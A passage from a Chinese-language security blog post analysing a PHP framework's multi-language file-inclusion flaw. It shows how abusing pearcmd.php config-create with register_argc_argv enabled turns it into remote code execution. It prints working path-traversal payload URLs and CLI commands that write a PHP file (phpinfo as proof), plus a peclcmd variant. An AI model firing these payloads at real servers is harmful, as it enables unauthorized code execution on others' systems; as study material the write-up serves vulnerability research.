<span class="keyword">case</span> <span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="variable">$data</span>) &#123;</span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="variable">$data</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他会判断文件后缀，如果是php，那么就用include进行包含，这里就是漏洞点，利用文件包含来进行任意代码执行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251504911.png" title="image-20240125150450783" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251504911.png" alt="image-20240125150450783"></a></p>
+<p>如果只利用这个点进行攻击，那么在实战中，就需要有任意文件上传的点，且知道上传文件的路径，才能进行包含造成RCE，同时需要关闭<code>open_basedir</code></p>
+<p>在没有任意文件上传的情况下，就需要找到环境自带的php文件，并且可以控制文件内容。这里就利用到了<code>pearcmd.php</code></p>
+<blockquote>
+<p>PEAR（PHP Extension and Application Repository）是一个PHP扩展和应用程序的仓库，提供了许多可重用的代码库和工具，以帮助PHP开发人员加快开发过程并提高代码质量。</p>
+<p>PEAR工具是用于管理和操作PEAR仓库中的代码库和工具的工具集合。其中包括一个命令行界面（CLI），允许用户执行各种操作，如安装、卸载、更新、列出可用的包等。</p>
+<p>而pearcmd.php是PEAR工具包的一部分，它是PEAR工具的命令行执行脚本，允许用户通过命令行界面来执行PEAR工具的功能，而无需直接调用PEAR库本身。</p>
+<p>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+</blockquote>
+<p>具体可以看：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></li>
+<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></li>
+</ul>
+<p>可以使用命令行的方式，让pear来创建文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ../lib/php/pearcmd.php config-create <span class="string">&quot;/&lt;?=phpinfo();exit();?&gt;&quot;</span> /tmp/1.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251606311.png" title="image-20240125160605194" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251606311.png" alt="image-20240125160605194"></a></p>
+<p>这里是用命令行的形式来创建文件，那如何通过文件包含的形式来创建文件呢</p>
+<p>pear读取参数会先尝试<code>$argv</code>，如果不存在再尝试<code>$_SERVER[&#39;argv&#39;]</code>，后者我们可通过query-string控制，这里需要在php.ini设置<code>register_argc_argv=On</code></p>
+<p>关于<code>register_argc_argv</code>，可以看panda师傅的文章<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/787.html">https://www.cnpanda.net/sec/787.html</a></p>
+<p>也可以看php官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/features.commandline.differences.php">https://www.php.net/manual/en/features.commandline.differences.php</a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609157.png" title="image-20240125160905109" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609157.png" alt="image-20240125160905109"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609156.png" title="image-20240125160928121" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251609156.png" alt="image-20240125160928121"></a></p>
+<p>总结来说，就是开启<code>register_argc_argv</code>之后，php就会将get传参里的查询字符串，以<code>+</code>为分隔符传给<code>$_SERVER[&#39;argv&#39;]</code>数组。</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619625.png" title="image-20240125161920552" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619625.png" alt="image-20240125161920552"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619305.png" title="image-20240125161943232" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251619305.png" alt="image-20240125161943232"></a></p>
+<p>在文件包含pearcmd.php的时候，pearcmd.php会读取<code>$_SERVER[&#39;argv&#39;]</code>的值，然后传递给pear，来执行相关操作。这样就能在文件包含里创建文件，造成任意代码执行了。这里也需要注意，要关闭<code>open_basedir</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt;+info.php</span><br></pre></td></tr></table></figure>
+
+<p>这里最好用bp或者yakit来发包，否则浏览器会自动将<code>&lt;</code>和<code>&gt;</code>进行url编码，导致无法解析php代码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640478.png" title="image-20240125164028134" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640478.png" alt="image-20240125164028134"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640497.png" title="image-20240125164035045" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251640497.png" alt="image-20240125164035045"></a></p>
+<p>这里payload的写法也是有讲究的，因为这样写，对应php来说是传入了一下三个参数</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251643439.png" title="image-20240125164317402" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251643439.png" alt="image-20240125164317402"></a></p>
+<p>但是对于<code>$_SERVER[&#39;argv&#39;]</code>，则是传入了一下四个元素</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; </span><br><span class="line">    [1] =&gt; config-create</span><br><span class="line">    [2] =&gt; /&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt;</span><br><span class="line">    [3] =&gt; info.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>转换成传入pearcmd.php的命令行格式就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php pearcmd.php config-create /&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;&lt;?=phpinfo();die();?&gt; info.php</span><br></pre></td></tr></table></figure>
+
+<p>所以可以看到<code>info.php</code>里，<code>/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd&amp;</code>字符串也存在里面</p>
+<p>在pearcmd字符被禁用的情况下，也可以使用<code>peclcmd.php</code>，他们一般在一个文件夹下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../../../../usr/local/phpstudy/soft/php/php-7.3.8/lib/php/peclcmd&amp;&lt;?=phpinfo();die();?&gt;+info2.php</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251647618.png" title="image-20240125164703533" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251647618.png" alt="image-20240125164703533"></a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上来看，这个漏洞利用的限制还是蛮多的</p>
+<ol>
+<li><p>需要开启多语言中间件</p>
+</li>
+<li><p>需要开启<code>register_argc_argv</code>，但是根据网上的大佬测试发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php的官⽅docker镜像，默认都开启了register_argc_argv</span><br><span class="line">php5.2.X版本，默认开启</span><br></pre></td></tr></table></figure>
+
+<p>而且<code>register_argc_argv</code>的可修改范围为<code>PHP_INI_PERDIR</code>，可在 php.ini，.htaccess 或 httpd.conf 中设定</p>
+</li>
+<li><p>需要有pearcmd.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。</span><br><span class="line"></span><br><span class="line">不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php</span><br><span class="line"></span><br><span class="line">在phpstudy安装的7.4之前的php，pearcmd.php的路径为/usr/local/phpstudy/soft/php/php-7.3.8/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>需要关闭<code>open_basedir</code></p>
+<p><code>register_argc_argv</code>的可修改范围为<code>PHP_INI_ALL</code>（在 PHP &lt; 5.2.3 时是 PHP_INI_SYSTEM）</p>
+</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251658042.png" title="image-20240125165811986" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401251658042.png" alt="image-20240125165811986"></a></p>
+<p>限制太多了，所以略显鸡肋，而这个打法使用于很多cms，因为他主要就是利用include文件包含php文件。</p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
